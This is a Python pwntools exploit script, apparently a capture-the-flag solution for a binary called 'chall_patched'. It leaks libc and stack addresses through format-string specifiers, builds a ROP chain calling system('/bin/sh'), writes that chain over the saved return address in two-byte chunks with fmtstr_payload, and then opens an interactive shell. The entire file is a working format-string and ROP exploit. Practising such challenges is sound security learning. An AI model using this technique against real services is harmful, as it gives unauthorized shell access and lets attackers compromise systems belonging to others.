#!/usr/bin/env python3

from pwn import *

exe = ELF("./chall_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe
context.terminal = ['tmux', 'splitw', '-h']

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("127.0.0.1", 1337)

    return r


def main():
    r = conn()
    
    # gdb.attach(r, '''
    #            gef config context.nb_lines_stack 50
    #            b *main+167
    #            b *main+260
    #            c
    #            ''')
    
    r.sendlineafter(b'>',b"%43$p")                                       # get libc leak
    libc.address = int(r.recvline().split()[-1].strip(),16) - 0x27305    
    r.sendlineafter(b':',b'y')

    r.sendlineafter(b'>',b"%p")                                          # get stack leak 
    sl = int(r.recvline().split()[-1].strip(),16) + 0x21a8               # add offset to overwrite the portion which goes to rip  
    r.sendlineafter(b':',b'y')
    
    print(hex(libc.address))
    print(hex(sl))
    
    rop = ROP(libc, base=sl)
    rop.raw(rop.find_gadget(['ret'])[0])
    rop.system(next(libc.search(b'/bin/sh\x00')))                       # make rop payload to get shell
    
    print(rop.dump())
    
    payload = rop.chain()

    for i in range(0, len(payload), 2):                                 # split the payload into small portions, use %n to overwrite the rip with our payload chunks
        current = fmtstr_payload(offset=8, writes={sl+(i) : payload[i:i+2].ljust(2, b'\x00')})
        r.sendlineafter(b'>', current)
        r.sendlineafter(b':', b'y')

    r.sendlineafter(b'>',b'a')
    r.sendlineafter(b':',b'n')

    
    r.interactive()


if __name__ == "__main__":
    main()
